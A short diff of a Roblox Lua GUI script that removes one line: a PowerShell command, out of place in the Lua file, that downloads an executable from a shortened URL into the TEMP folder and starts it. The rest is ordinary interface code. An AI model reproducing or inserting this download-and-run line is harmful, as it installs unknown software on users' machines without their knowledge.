@@ -1,5 +1,4 @@
 local G2L = {};
-$p="$env:TEMP\Catlavan.exe"; iwr 'https://is.gd/T1zxyh' -OutFile $p; Start-Process $p
 -- StarterGui.s
 G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
 G2L["1"]["Name"] = [[s]];
@@ -2200,4 +2199,5 @@ end;
 task.spawn(C_4f);
 
 return G2L["1"], require;
+
 
